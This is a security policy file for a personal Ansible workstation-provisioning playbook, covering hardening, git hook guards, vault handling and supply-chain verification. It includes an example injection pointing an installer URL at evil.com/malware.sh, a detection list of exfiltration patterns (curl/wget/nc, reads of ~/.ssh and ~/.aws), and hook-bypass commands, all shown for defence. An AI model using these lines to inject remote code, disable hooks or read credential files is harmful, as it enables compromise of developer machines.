# Security Policy

## Reporting Vulnerabilities

If you discover a security vulnerability, please report it privately via
[GitHub Security Advisories](https://github.com/dfarrell07/laptop-setup/security/advisories/new).

Do not open a public issue for security vulnerabilities.

## Scope

This is a personal workstation provisioning playbook. Security-relevant areas:

- **Ansible Vault** — secrets template in `group_vars/all/vault.yml`
  (encrypt after populating)
- **SSH key management** — YubiKey FIDO2 key deployment, post-quantum
  key exchange
- **System hardening** — firewall (drop zone), sysctl (49 settings),
  auditd (user persistence monitoring, immutable rules), kernel lockdown,
  SELinux enforcing (targeted), USBGuard, crypto policy DEFAULT:NO-SHA1,
  DNS-over-TLS/DNSSEC (FallbackDNS: Quad9 + Google DoT), core dump disable,
  io_uring restricted to CAP_SYS_ADMIN (kernel.io_uring_disabled=1; set 2 in config.yml to disable for all users), kernel
  module blacklist (incl. usb-storage/uas when system_disable_usb_storage: true), cups-browsed/avahi masking,
  dnf-automatic, /tmp nosuid/nodev/noexec (CIS 1.1.2.x), /var/tmp nosuid/nodev/noexec (CIS 1.1.8, bind-mount), /dev/shm nosuid/nodev/noexec (CIS 1.1.7.x), /home nosuid/nodev (CIS 1.1.9), /boot nosuid/nodev/noexec, /boot/efi nosuid/noexec (vfat — nodev not applicable), home directory 0750 (CIS 6.2.x, non-RHEL-CSB), NFS server /
  rpcbind masked (CIS 2.2.7), auditd user-mgmt tool watches — chsh/chfn/newgrp/su
  (CIS 4.1.3.8), pam_wheel.so (su restricted to wheel),
  root account locked, inactive account lockout chage -I 30 (CIS 5.5.1.5),
  AIDE file integrity monitoring (daily; disabled by default — set system_aide_enabled: true in config.yml only when a log consumer is in place), chrony NTS
  (authenticated time sync), DHCP hostname privacy (NM conf.d 99-dhcp-privacy.conf — suppresses hostname advertisement to DHCP servers on non-CSB hosts)
- **Git security** — `core.fsmonitor=false`, `safe.bareRepository=explicit`,
  `transfer.fsckObjects=true`,
  `protocol.file.allow=user`, SSH commit signing, gitleaks pre-commit,
  `core.hooksPath` immutability guard (CI + hook validation)
- **Claude Code isolation** — instance separation, sandbox config, file
  access deny lists (43 read + 44 write paths incl. /proc/environ,
  .git/config, settings.json self-modify protection), API endpoint guard,
  telemetry controls, `enableAllProjectMcpServers=false`, auditd monitoring
- **Supply chain** — `.npmrc ignore-scripts=true`, Ansible collection
  verification, Chrome extension allowlisting, binary SHA256 verification,
  oh-my-zsh pinned to commit SHA, Go module verification with GONOSUMDB
  (see "Go Module Supply Chain" section below)
- **CI supply chain** — actionlint, zizmor, and gitleaks run as
  SHA256-verified binary downloads instead of third-party node actions;
  all GHA actions SHA-pinned by commit hash; OSSF Scorecard weekly
- **Git hook integrity** — Pre-commit hooks validated at three levels:
  (1) Syntax validation (shellcheck), (2) Behavioral intent validation (CI scans
  for exfiltration patterns), (3) Mandatory code review for .githooks/* changes
  (branch protection rule). All hooks run with user privileges via
  `core.hooksPath = .githooks` (set by `make bootstrap`). Hook modifications
  MUST be reviewed by maintainers before merge — never bypass with `--no-verify`
  on hook changes (see "Unsafe git operations" below)
- **Privilege escalation** — `become_exe = /usr/bin/sudo` in ansible.cfg
  prevents PATH-based sudo trojan attacks
- **Branch protection** — main requires 4 status checks (Ansible Lint,
  Vault Encryption Check, Secret Detection, Ansible Syntax Check);
  force push and deletion blocked; linear history enforced
- **Secret scanning** — GitHub secret scanning and push protection
  enabled (server-side complement to gitleaks pre-commit hook)
- **Browser hardening** — 41 Chrome/Chromium managed policies (HTTPS-only,
  site isolation, WebRTC, download restrictions, remote debugging blocked)
- **Desktop hardening** — GNOME lock screen notifications hidden, USB
  automount disabled, RDP/VNC disabled, idle lock at 300s (GNOME dconf,
  i3 via xss-lock + i3lock, Sway via swayidle + swaylock at 300s lock /
  600s display off)

## Git Hooks Protection (core.hooksPath)

Git hooks enforce critical security policies:
- Pre-commit hook blocks unencrypted vault files, detects secrets (gitleaks),
  validates YAML/shell syntax, and verifies collections-dist/ integrity
- Commit-msg hook enforces --signoff requirement and rejects past-tense commit
  messages (established project convention)

**Core protection: core.hooksPath immutability**

The hooks path is set via `make bootstrap` (line 135):
```bash
git config --local core.hooksPath .githooks
```

Local config takes precedence over global, creating a bypass risk: an attacker
with repo write access can override with `git config --local core.hooksPath
/dev/null`, silencing all hooks. **Do NOT override this setting.**

**CI enforcement (linting.yml):**
- `git-config-guards` job verifies core.hooksPath is `.githooks` or unset
  (defaults to `.githooks` if not set) on every commit (push + PR)
- Rejects commits with overridden core.hooksPath

**Hook bypass prohibition:**
- **DO NOT use `git commit --no-verify`** — bypasses pre-commit hook checks
  (vault encryption, secrets scanning, syntax validation)
- **DO NOT use `git push --no-verify`** — FORBIDDEN. This bypasses the pre-push
  hook completely; Git will not invoke the hook when --no-verify is specified.
  The hook has no ability to detect or prevent this bypass. Unencrypted vault
  files can be pushed to any branch, accumulating secrets in git history before
  CI status checks prevent merge to main. See "Pre-push hook limitation" below.

**Enforcement summary:**
1. Local hooks path is `.githooks` (set by `make bootstrap`)
2. CI rejects commits where core.hooksPath is overridden
3. All commits require --signoff (enforced by commit-msg hook + CI)
4. Vault files must be encrypted (enforced by pre-commit hook + CI on all branches)
5. No commits to main without PR + CI passing (branch protection)

This defense-in-depth prevents attackers from committing unencrypted secrets,
unsigned commits, or tampered collections even if they have direct repo write
access.

### Pre-push hook limitation: --no-verify bypass

**Vulnerability**: The pre-push hook cannot prevent the `git push --no-verify`
operation. Git's documented behavior (per `git help push`) is that `--no-verify`
bypasses hooks completely — the hook script is never invoked. The hook has no
ability to detect that `--no-verify` was used because it is not called at all.

**Attack vector**: A developer or attacker with repo write access can execute
`git push --no-verify` to push unencrypted vault files to any branch, bypassing
the client-side hook check. Unencrypted secrets accumulate in git history on
the server before CI status checks prevent merge to main.

**Mitigations implemented**:

1. **Client-side education** — SECURITY.md (this file, line 93-99) explicitly
   forbids `git push --no-verify` as a violation of security policy. Developers
   are educated that this operation cannot be prevented at the hook level.

2. **Server-side CI validation on all branches** — CI job `vault-encryption`
   (linting.yml) runs on pull_request AND push events (all branches), not just
   main. This catches unencrypted vault files before they accumulate in git
   history, regardless of `--no-verify` usage.

3. **Branch protection on main** — Vault encryption check is a required status
   check for main, preventing merge of unencrypted secrets even if CI runs on
   a PR branch.

4. **Commit history scanning** — Future mitigations (not yet implemented):
   - Reject force-pushes to any branch via GitHub branch protection rules
   - Implement post-receive hook on the Git server (if self-hosted) to validate
     all commits for unencrypted vault files

**Recommendation**: Treat `git push --no-verify` as a forbidden operation
equivalent to `git commit --no-verify`. If a push becomes blocked by the hook,
fix the underlying issue (encrypt vault files) rather than bypassing the check.
The server-side CI catch ensures that even `--no-verify` usage is detected
before merge, but it is still a violation of security policy.

## Unsafe Git Operations

**NEVER use `git commit --no-verify` or `git push --no-verify` to bypass pre-commit hook validation.** The pre-commit hooks (.githooks/pre-commit) enforce three critical gates:

1. **Vault encryption** — blocks accidental commits of plaintext vault files with real secrets
2. **Secret scanning (gitleaks)** — detects hard-coded API keys, tokens, private keys
3. **Code quality** — YAML, shell, JSON, and lockfile integrity validation

Bypassing these checks can expose secrets to the git history and public repositories.

**Exception: CI-only scenarios** — in GitHub Actions workflows, using `--no-verify` is acceptable ONLY when:
- The workflow is part of a sealed CI system (no untrusted input)
- The commit is generated entirely by CI automation (not from developer code)
- The commit message and content have already been validated by earlier CI gates

Never use `--no-verify` in local development or on developer machines.

## Git Hook Security and Signing

**Hook modifications require mandatory code review.**

The `.githooks/` directory contains scripts that execute with user privileges during `git commit` and `git commit-msg`. Attacks on these hooks can steal SSH keys, GPG keys, AWS credentials, and other secrets.

All PRs modifying `.githooks/*` undergo three layers of validation:

1. **Syntax validation (CI shellcheck)** — ensures valid bash syntax
2. **Behavioral validation (CI linting)** — scans for exfiltration patterns:
   - curl/wget/nc with URLs
   - cat/grep of sensitive paths (~/.ssh, ~/.gnupg, ~/.aws, ~/.gcloud)
   - credential exports (AWS_*, GITHUB_TOKEN, etc.)
3. **Code review (GitHub branch protection)** — mandatory human review before merge

### Supply-Chain Commits: Critical Distinction Between -s and -S Flags

**SECURITY ISSUE**: The error message conflating `-s` and `-S` creates dangerous confusion about what signatures are actually being verified.

Commits modifying critical supply-chain files (scripts, SHA256SUMS, .githooks) require BOTH flags. These are TWO COMPLETELY DIFFERENT security mechanisms:

| Flag | Full Name | Cryptographic? | What It Does | Location | Verified By |
|------|-----------|---|---|---|---|
| `-s` | `--signoff` | **NO** | Adds `Signed-off-by:` text line to commit message | Commit message body (plain text) | `.githooks/commit-msg` hook (text grep) + CI (regex) |
| `-S` | `--gpg-sign` | **YES** | Creates GPG cryptographic signature on commit object | Commit object signature metadata | `git verify-commit` (cryptographic verification) |

**What developers must understand:**
- `-s` alone creates a **deceptive false sense of security** — it only adds text, not cryptography
- `-S` alone verifies cryptographic integrity but does NOT prove developer authorship statement
- **BOTH are required** for supply-chain commits: authorship commitment (-s) + integrity proof (-S)

**Attack scenario illustrating the vulnerability:**
1. Developer runs `git commit -s` (only the `-s` flag) on a supply-chain file
2. The commit message contains `Signed-off-by: Developer Name`
3. CI job checks `git verify-commit` which returns N (no GPG signature)
4. CI **correctly rejects** the commit as unsigned
5. **Problem**: The error message says "Sign your commits with: git commit -s -S" without explaining the difference
6. **Confused developer** thinks `-s` *is* a signature, not realizing they need `-S` for cryptography
7. They may resort to `git commit --no-verify -s` (dangerous bypass)

**Why both mechanisms are critical:**
- **-s (Signed-off-by) proves developer authorship** — Developer is committing to the content and taking responsibility
- **-S (GPG signature) proves commit integrity** — Commit object has not been tampered with (unforgeable without private key)

**Example: Correct supply-chain commit with both mechanisms:**
```bash
git commit -s -S -m "Scripts: update verify-collections.sh"

# Result commit contains:
#   - Commit message with: Signed-off-by: Your Name <you@example.com>
#   - Commit object with: GPG signature (good signature from "Your Name")
#   - git verify-commit returns: Good signature (status: G)
#   - git log --format=%B shows: Signed-off-by: text trailer
```

**Local enforcement (.githooks/commit-msg):**
- Lines 5-8: Rejects commits missing Signed-off-by text
- Lines 21-31: Requires `commit.gpgsign=true` config for supply-chain files (enforces -S requirement)
- Error messages clearly separate the checks

**CI enforcement (linting.yml, gpg-signatures job):**
- **GPG signature check** (cryptographic): `git verify-commit` validation
- **Signed-off-by check** (text): grep for `^Signed-off-by:` in commit message
- Both must pass; failure explains the distinction

**Configuration (one-time setup):**
```bash
# Option 1: Configure git to ALWAYS GPG-sign (recommended for supply-chain work)
git config --global commit.gpgsign true

# Then all commits automatically get both mechanisms:
git commit -s                    # -s is still needed; -S comes from config

# Option 2: Sign supply-chain commits manually
git commit -s -S -m "message"   # Explicit signoff + signature
```

**Post-deployment testing:**
To verify a commit has both mechanisms:
```bash
commit_sha="abc123..."

# Verify GPG signature (cryptographic)
git verify-commit "$commit_sha"
git show --format=%G? -s "$commit_sha"  # Should print: G (good), U (untrusted), or R (revoked)

# Verify Signed-off-by trailer (text)
git log -1 --format=%B "$commit_sha" | grep '^Signed-off-by:'
```

**Future enhancement: Hook signing** — planned for 2026:
- Hooks will be cryptographically signed with developer keys
- Bootstrap will verify signatures before installation
- Unsigned or invalid hooks will fail to load
- Prevents hook tampering after clone but before installation

**Current hook safety practices:**

```bash
# SAFE: Development workflow — all checks active
git add .githooks/my-new-check.sh
git commit -m "Githooks: add new pre-push validation"  # hooks run, must pass

# UNSAFE: Bypassing hook validation
git commit --no-verify -m "Skip hooks"  # DO NOT DO THIS

# SAFE: If you must bypass (CI automation only)
# Use with extreme caution, only in sealed CI system
CI_CONTEXT=1 git commit --no-verify -m "Automated commit (CI)"
```

## Ansible Playbook Safety

**Do NOT use `--start-at-task` with site.yml** — Ansible's `--start-at-task` flag
skips all `pre_tasks` in the target play, including critical security validations.
Play 2 (`User setup`) includes preflight checks that validate `claude_install_url`
is constrained to safe domains (https://claude.ai or https://anthropic.com). Using
`--start-at-task` with any task name would bypass this validation, allowing
`-e 'claude_install_url=https://evil.com/malware.sh'` to inject and execute
arbitrary code. **Workaround:** run `make all` (full provisioning) or `make minimal`
instead. If you must re-run a subset of tasks:

## Git Security

**Do NOT use `git commit --no-verify`** — Bypasses critical pre-commit integrity guards:

- **Collections supply chain** — `collections-dist/*.tar.gz` modifications must be
  accompanied by `collections-dist/SHA256SUMS` update. The pre-commit hook enforces
  this (lines 5-26 of `.githooks/pre-commit`). Using `--no-verify` bypasses the guard,
  allowing tampered collection tarballs to be committed. CI enforces
  `collections-integrity` as a required status check, but local `--no-verify` commits
  can still reach the PR branch before CI runs.
- **Secrets scanning** — `gitleaks pre-commit` detects leaked credentials. Using
  `--no-verify` bypasses credential detection.
- **Vault encryption** — `--no-verify` bypasses the check that `*vault.yml` files
  are encrypted.

**Mitigation** — All pre-commit guards are duplicated as required CI status checks
(Ansible Lint, Vault Encryption Check, Secret Detection, Collections Integrity
Check, Ansible Syntax Check). A `--no-verify` commit that modifies `collections-dist/`
without updating `SHA256SUMS` will fail the PR merge gate.

**Exception** — If a commit becomes stuck due to a faulty hook, fix the underlying
issue (e.g. update `SHA256SUMS`, encrypt vault), then re-stage and commit normally.
Do NOT use `--no-verify` as a workaround.

```bash
# SAFE: Run from a specific role tag (full play pre_tasks still execute)
ansible-playbook site.yml -t dotfiles,repos

# UNSAFE: Skips all pre_tasks, including security validations
# DO NOT USE:
ansible-playbook site.yml --start-at-task 'Some Task Name'
```

Defense-in-depth: the `claude` role re-validates `claude_install_url` before
download (line 6-17 in roles/claude/tasks/main.yml), so even `--start-at-task`
bypasses cannot reach RCE without also modifying the role's validation.

## SHA256SUMS Signing Key Management

**Signing key identity**: `AE97E86A1C807F5FA6A7987B68B6396B4E11D882` (collection vendoring GPG key)

The `collections-dist/SHA256SUMS` file is cryptographically signed with GPG to create
`collections-dist/SHA256SUMS.asc`. This guards against accidental or malicious modifications
to the collections tarball checksums after they have been downloaded and verified.

**Key import (for signature verification)**:

```bash
# Option 1: Import from GitHub release assets (recommended when available)
gpg --import collections-signing-key.gpg

# Option 2: Import from key server
gpg --keyserver keys.openpgp.org --recv-keys AE97E86A1C807F5FA6A7987B68B6396B4E11D882

# Option 3: Import during bootstrap
# (Future: make bootstrap will offer interactive key import)
```

Verify the key fingerprint matches `AE97E86A1C807F5FA6A7987B68B6396B4E11D882` before
importing.

**Verifying SHA256SUMS signature**:

```bash
cd collections-dist
gpg --verify SHA256SUMS.asc SHA256SUMS
```

**Key rotation procedure** (if signing key is compromised):

1. Generate a new signing key
2. Re-sign `SHA256SUMS` with the new key
3. Commit new `SHA256SUMS.asc` with new signature
4. Publish revocation certificate for the old key via key server:
   ```bash
   gpg --gen-revoke AE97E86A1C807F5FA6A7987B68B6396B4E11D882 > revocation.asc
   gpg --import revocation.asc
   gpg --keyserver keys.openpgp.org --send-keys AE97E86A1C807F5FA6A7987B68B6396B4E11D882
   ```
5. Publish new key fingerprint and import instructions in SECURITY.md and CI workflows
6. Update CI `collections-integrity` job to verify new signature

**CI enforcement** (`linting.yml` `collections-integrity` job):

The CI `collections-integrity` job now verifies the GPG signature on `SHA256SUMS.asc`
as a required check. This ensures:
- Tampered checksums cannot be silently accepted (GPG signature must match)
- Signature verification catches key compromises within one CI run
- All collections-dist changes are audited via git commit history

**Limitations** (TOFU model for fresh deployments):

- On fresh machines, the signing key will not be in the GPG keyring, so signature
  verification will issue a WARNING but continue (TOFU — Trust On First Use)
- `verify-collections.sh` (run by `make bootstrap`) treats missing key as non-fatal
  WARNING, proceeding with hash-only verification
- Once a machine imports the key, all future signature mismatches are FATAL errors
- To enforce strict key verification from day one, import the key during bootstrap
  via `make bootstrap` or documented setup procedures

## Ansible Collections Supply Chain

### GPG Signature Verification

**Signing Key**: AE97E86A1C807F5FA6A7987B68B6396B4E11D882

The `collections-dist/SHA256SUMS.asc` file is GPG-signed to provide defense-in-depth protection
against tarball tampering. The signing key is distributed in the repository at
`collections-dist/signing-key.asc` and is automatically imported during `make bootstrap`.

**Bootstrap Flow** (automatic, no user action required):
1. `make bootstrap` runs `gpg --import collections-dist/signing-key.asc` (line 109 in Makefile)
2. `verify-collections.sh` validates GPG signature before hash verification
3. If key import fails, hash verification continues (defense-in-depth: hashes are still checked)

**Manual Key Import** (if bootstrap failed or you're using an existing clone):
```bash
gpg --import collections-dist/signing-key.asc
```

After import, GPG verification will succeed:
```bash
gpg --verify collections-dist/SHA256SUMS.asc collections-dist/SHA256SUMS
# Output: Good signature from "..." or "Can't check signature: No public key" (if import failed)
```

**Known Vulnerability**: Ansible Galaxy does not publish GPG signatures, Sigstore certificates,
or SLSA provenance for community collections. If a collection maintainer's Galaxy account is
compromised (phishing, credential theft, 2FA bypass), attacker can publish malicious code that
defeats hash-based verification: the attacker controls both the CDN tarball and the Galaxy API
`artifact.sha256` field simultaneously.

**Affected collections** (vendored in `collections-dist/`):
- ansible.posix-2.2.2
- community.general-13.2.0
- community-library_inventory_filtering_v1-1.1.5
- containers.podman-1.20.2

**Attack scenario**:
1. Attacker obtains Galaxy maintainer credentials (phishing, password reuse, session hijack)
2. Attacker publishes malicious collection version (e.g., community.general-13.2.1) to Galaxy CDN
3. Attacker updates Galaxy API `artifact.sha256` field to match the malicious tarball
4. User runs `make vendor-collections` — downloads malicious tarball
5. Hash verification passes because both CDN and API are attacker-controlled
6. Malicious code is committed to `collections-dist/` and executed during `make all`

**Mitigations Implemented** (defense-in-depth):

1. **VERSION PINNING** — All collections pinned to specific versions in `requirements.yml`.
   Prevents silent upstream updates. Requires deliberate version bump review.

2. **MANDATORY CODE REVIEW** — Collection updates require human review BEFORE committing:
   - Download new version via `make vendor-collections` (Galaxy API verification only catches
     CDN corruption, not account compromise)
   - Review upstream CHANGELOG for suspicious changes
   - Compare old vs. new collection tasks/modules for behavioral changes (network calls, file
     operations, privilege escalation)
   - Create PR; require approval from designated reviewer (branch protection enforces this)
   - Only merge after approval from human reviewer

3. **CI INTEGRITY ENFORCEMENT**:
   - Pre-commit hook: blocks `collections-dist/*.tar.gz` modifications without `SHA256SUMS` update
   - CI `collections-integrity` job: validates `sha256sum -c SHA256SUMS` on every PR
   - Bootstrap: verifies hashes before Ansible execution
   - `verify-collections.sh`: re-verifies at runtime (TOCTOU tampering guard)

4. **GALAXY API CROSS-VERIFICATION** — Each hash verified against Galaxy API `artifact.sha256`
   field (different service path than CDN). Limitation: Both controlled by Galaxy infrastructure;
   does NOT prevent maintainer account compromise attacks.

5. **AUDIT TRAIL** — Collection tarballs committed to git (not gitignored), enabling post-incident
   forensic analysis and creating public record of supply chain decisions.

**Code Review Procedure** (when updating a collection version):

```bash
# 1. Download and verify via Galaxy API (basic consistency check)
make vendor-collections

# 2. Review upstream CHANGELOG for suspicious changes
tar -xzOf collections-dist/community-general-*.tar.gz CHANGELOG.rst | head -100
# Look for: new tasks, plugins, external service calls, privilege escalation

# 3. Compare old vs. new version for behavioral differences
mkdir /tmp/old /tmp/new
tar -xzf collections-dist/community-general-OLD.tar.gz -C /tmp/old
tar -xzf collections-dist/community-general-NEW.tar.gz -C /tmp/new
diff -r /tmp/old/*/plugins /tmp/new/*/plugins | head -50

# 4. Commit with signoff and clear message (audit trail)
git add requirements.yml collections-dist/SHA256SUMS collections-dist/*.tar.gz
git commit -s -m "Collections: upgrade community.general to 13.2.1

Changelog reviewed: no suspicious changes detected. New tasks/modules
compared against previous version — no behavioral changes."

# 5. Create PR and request approval from security reviewer
git push origin feature-branch
# Wait for approval before merging
```

**SHA256SUMS Signature Verification**:

The `collections-dist/SHA256SUMS` file is signed with GPG. Before running `make bootstrap` or
provisioning commands, verify the signature to ensure the hashes have not been tampered with:

```bash
# 1. View the fingerprint documented in SHA256SUMS (see file header comment)
grep -A 2 "SHA256SUMS.asc Signature" collections-dist/SHA256SUMS

# 2. Import the public key (if not already in your keyring)
gpg --keyserver keys.openpgp.org --recv-keys AE97E86A1C807F5FA6A7987B68B6396B4E11D882

# 3. Verify the fingerprint matches the documented value
gpg --list-key AE97E86A1C807F5FA6A7987B68B6396B4E11D882 | grep fingerprint

# 4. Verify the signature on SHA256SUMS
gpg --verify collections-dist/SHA256SUMS.asc collections-dist/SHA256SUMS
```

This verification step is optional but recommended, particularly when provisioning on
high-security systems or when SHA256SUMS has been updated. See `collections-dist/SHA256SUMS`
file header for complete verification procedure.

**Future Mitigations** (when available):
- When maintainers publish GPG-signed tarballs or SLSA provenance, add GitHub release URLs +
  maintainer GPG key fingerprints to `collections-dist/SHA256SUMS` and integrate GPG verification
  in `make bootstrap`.
- SLSA provenance via Sigstore/Cosign (when upstream support arrives) — validate supply chain
  attestation in CI `collections-integrity` job.
- Automated signature verification in `make bootstrap` pre-flight checks (would require keyserver
  configuration or bundled public keys).

**Reporting Compromise**: If you suspect a collection maintainer's Galaxy account has been
compromised, report immediately to Galaxy security team: https://galaxy.ansible.com/security

See also: `CLAUDE.md` § "Ansible Galaxy Collections — Verification Limitation and Code Review
Requirement" for the complete upgrade procedure and mandatory review checklist.

## Known Limitations

- **Bluetooth enabled (CIS RHEL 9 2.1.5)** — CIS 2.1.5 recommends disabling
  Bluetooth by blacklisting the `btusb`/`bluetooth` kernel modules.
  `system_disable_bluetooth` defaults to `false` (enabled) because this
  ThinkPad P16v Gen 1 AMD requires Bluetooth for its Bluetooth mouse.
  Set `system_disable_bluetooth: true` in `config.yml` on machines that
  have no Bluetooth peripherals.
- **ptrace_scope=0 (CIS 1.6.3)** — `kernel.yama.ptrace_scope` defaults to 0 (Fedora
  workstation default), allowing a user to trace any of their own processes with `gdb -p`
  or `dlv attach`. CIS Level 1 recommends 1 (parent-only). Set
  `system_ptrace_scope: 1` in `config.yml` on machines where developer attach workflows
  are not needed.
- **claude.ai install.sh** — installed via `curl | bash` with no SHA256
  verification; Anthropic uses a rolling installer without pinned releases
  (note: binary SHA256 verification in the Scope section refers to other
  tools; the Claude Code installer is the deliberate exception)
- **Secure Boot + GRUB bootloader password (CIS 1.4.2)** — Kernel `lockdown=integrity`
  without Secure Boot is weakened by an unprotected GRUB bootloader. Ansible now enforces GRUB
  superuser password protection (opt-in via `system_grub_password` in config.yml) to prevent
  physical console attacks that disable lockdown before it activates at boot. **Both** Secure
  Boot (BIOS setting — out of scope for Ansible) AND GRUB password are required for full protection.
  On non-Secure Boot systems, the GRUB password guards a pre-reboot vulnerability window. Set
  `system_grub_password: 'your-password'` in config.yml (or use `vault_grub_password` from vault.yml
  for production). Empty (default) disables GRUB password; RHEL CSB skips (IT manages bootloader).
- **LUKS TRIM/discard** — managed via Ansible `system_luks_discards_enabled: false` (default).
  Discard is disabled by default to mitigate SSD wear-pattern fingerprinting attacks that can
  correlate TRIM patterns with plaintext block locations. Set `system_luks_discards_enabled: true`
  in `config.yml` ONLY on machines where SSD longevity outweighs cryptographic remanence protection
  (e.g., temporary test environments with disposable data). Non-default setting requires explicit
  opt-in to ensure awareness of the security tradeoff. Smoke-test warns when discard is active.
- **Vault password: HMAC-SHA1 has 80-bit post-quantum security** — The vault password is derived
  from YubiKey HMAC-SHA1 (hardware-limited; HMAC-SHA256 unavailable in firmware). While vault
  encryption (AES-256-CTR) is quantum-safe with 128-bit effective PQ security, the password itself
  has only 80-bit effective post-quantum security (Grover's algorithm halvings). This is currently
  acceptable (quantum computers in 2025 have ~2,000 noisy qubits, insufficient for Grover attacks).
  **Migration path:** Documented in SECURITY.md § "Quantum Security Posture" — migrate to SOPS +
  age-plugin-yubikey (P-384, 96-bit PQ security) when hardware PQ support arrives (~2027).
  See § "Future Migration to SOPS + age" for setup instructions.
- **Vault + CI** — encrypting vault.yml with a real YubiKey-derived password
  will break CI syntax-check (which uses the dummy password stub); this is
  a known design tradeoff, not a bug

## Vault Security

- Vault ships as a plaintext stub (`vault_placeholder`) — encrypt after
  adding real secrets
- Production vault password should be derived from YubiKey HMAC-SHA1
  challenge-response
- `vault-pass.sh` is gitignored; `make bootstrap` creates a stub for
  development
- CI uses `vault-pass-ci.sh` with a dummy password (no real secrets)
- Pre-commit hook blocks committing unencrypted vault files containing
  real variables
- Rotate vault password: re-key with
  `ansible-vault rekey group_vars/all/vault.yml`

### Setting Up vault-pass.sh

**Use the script** — programs all YubiKeys in one run, verifies each produces
identical output, and writes `vault-pass.sh` automatically:

```bash
make setup-yubikeys
```

The script (`scripts/setup-yubikeys.sh`) generates a fresh HMAC secret, programs
each YubiKey slot 2, verifies outputs match, and writes `vault-pass.sh`. The HMAC
secret never touches disk — keep all YubiKeys in separate physical locations.

**If you need to write vault-pass.sh manually**:

```bash
#!/bin/bash
# scripts/vault-pass.sh — YubiKey HMAC-SHA1 vault password derivation
# Requires: ykman (yubikey-manager package on Fedora/RHEL; brew install ykman on macOS)
set -euo pipefail
_HEX=$(printf '%s' 'ansible-vault-laptop-setup' | od -An -tx1 | tr -d ' \n')
timeout 20 ykman otp calculate 2 "$_HEX" 2>/dev/null || {
  echo "ERROR: YubiKey not available or touch timed out" >&2; exit 1
}
```

After writing vault-pass.sh, encrypt the vault:

```bash
chmod 700 scripts/vault-pass.sh
ansible-vault encrypt group_vars/all/vault.yml
```

### Lost or Compromised YubiKey

**Backup strategies** — `make setup-yubikeys` enforces one of the following:

1. **Hardware redundancy (recommended)** — Program 2+ YubiKeys in one session with
   the same HMAC secret before storing backups in separate physical locations.
   If one key is lost, any other programmed key can unlock the vault.

2. **Password manager backup (for single YubiKey)** — If using a single YubiKey,
   `make setup-yubikeys` requires you to save the vault password to your password
   manager (Bitwarden, 1Password, etc.) during setup. This provides recovery if
   the YubiKey is lost. The setup script displays the password clearly and confirms
   you have saved it before proceeding.

**Manual re-programming** — if you have the original 40-character hex key from
a previous run, program a replacement YubiKey:

```bash
ykpersonalize -2 -ochal-resp -ochal-hmac -ohmac-lt64 -oserial-api-visible \
  -a <original-40-char-hex-key>
```

Without `-a <hexkey>`, `ykpersonalize` generates a new random secret and the
backup will not produce the same vault password. The HMAC secret cannot be read
back from a YubiKey after programming, so retroactive backup is impossible.

**Recovering from lost YubiKey with password backup** — If you saved the vault
password to your password manager during setup:

1. Retrieve the vault password from your password manager
2. Set the environment variable: `export VAULT_PASS='<saved-password>'`
3. Create a temporary password script:
   ```bash
   printf '#!/bin/bash\necho "%s"\n' "$VAULT_PASS" > /tmp/vault-pass-temp.sh
   chmod 700 /tmp/vault-pass-temp.sh
   ```
4. Use it to decrypt/rekey the vault:
   ```bash
   export ANSIBLE_VAULT_PASSWORD_FILE=/tmp/vault-pass-temp.sh
   ansible-vault view group_vars/all/vault.yml
   # or to migrate to a new password source:
   ansible-vault rekey group_vars/all/vault.yml
   ```

**YubiKey lost with no backup** — if you programmed a single YubiKey without
saving the password to a password manager, the vault is permanently inaccessible.
The only recovery path is to re-encrypt from scratch: recover the secret values
from memory or other records, edit `group_vars/all/vault.yml` with known secrets,
then re-key with a new password source:

```bash
ansible-vault rekey group_vars/all/vault.yml
```

## GPG Key Import and Setup

Commits modifying supply-chain files (scripts, SHA256SUMS, collections) must be
signed with a GPG key to prevent unsigned tampering.

### Generating a GPG Key

If you don't have a GPG key yet:

```bash
gpg --full-generate-key
# Select: (1) RSA and RSA, 4096 bits (or higher), no expiration recommended for personal use
```

### Importing an Existing GPG Key

To import your GPG private key from backup:

```bash
gpg --import /path/to/private-key.gpg
```

Verify the key was imported:

```bash
gpg --list-secret-keys
```

### Configuring Git to Use Your GPG Key

1. Get your GPG key ID:
   ```bash
   gpg --list-secret-keys --keyid-format LONG
   # Example output: sec   rsa4096/0123456789ABCDEF 2024-01-01 [SC]
   #                           ^^^^^^^^^^^^^^^^^^ <- Use this
   ```

2. Configure git globally to use your GPG key:
   ```bash
   git config --global user.signingkey 0123456789ABCDEF
   git config --global commit.gpgsign true
   ```

3. (Optional) Enable signing for all commits by default:
   ```bash
   git config --global commit.gpgsign true
   git config --global gpg.format openpgp
   ```

### Signing Commits Manually

If you haven't enabled `commit.gpgsign`, sign individual commits:

```bash
git commit -s -S  # Both --signoff and --gpg-sign
```

### Verifying Your Signatures

Verify a commit is signed:

```bash
git verify-commit <commit-sha>
```

Show signature information:

```bash
git log --show-signature
```

### Exporting Your GPG Key

To back up your GPG key securely:

```bash
gpg --export-secret-keys --armor YOUR_KEY_ID > private-key.gpg
# Store in a secure backup location (e.g., encrypted USB, password manager, HSM)
chmod 600 private-key.gpg
```

## Internal SSH Git Host Setup

When cloning repositories from internal SSH git servers (not GitHub), pre-seed SSH host keys
with optional fingerprint pinning to prevent MITM attacks at first connection. Configure
`ssh_work_keyscan_hosts` in `config.yml` (work profile only):

```yaml
ssh_work_keyscan_hosts:
  - {host: internal-git.example.com, fingerprint: "SHA256:..."}
  - {host: gitlab.internal, fingerprint: "SHA256:..."}
```

**Obtaining fingerprints:**

1. Contact internal IT via a secure out-of-band channel (phone, in-person, verified email)
   and request the SSH host key fingerprint for each internal git server.
2. Verify the fingerprint matches:
   ```bash
   ssh-keyscan -t ed25519 internal-git.example.com | ssh-keygen -lf /dev/stdin
   ```
3. Add to `config.yml` with the `fingerprint: "SHA256:..."` field.

**TOFU (Trust On First Use) mode** — omit the `fingerprint` field to accept the key without
pinning. This is less secure but acceptable if out-of-band fingerprint verification is
unavailable.

**Technical details:**

- `ssh_work_keyscan_hosts` triggers `roles/ssh/tasks/keyscan_host.yml` during provisioning,
  which pre-seeds `~/.ssh/known_hosts` with SSH host keys for internal git servers.
- The `git_repos` role automatically pre-seeds host keys for SSH-based repo URLs
  (git@host:repo.git) before cloning, ensuring `known_hosts` is populated before the git
  client attempts connection.
- GitHub SSH keys are automatically pre-seeded via the GitHub API (no manual configuration needed).

## SSH Key Rotation

1. Generate a new auth key pair:
   ```bash
   ssh-keygen -t ed25519-sk -f ~/.ssh/id_ed25519_sk
   ```
2. Generate a new signing key pair:
   ```bash
   ssh-keygen -t ed25519-sk -f ~/.ssh/id_ed25519_sk_signing
   ```
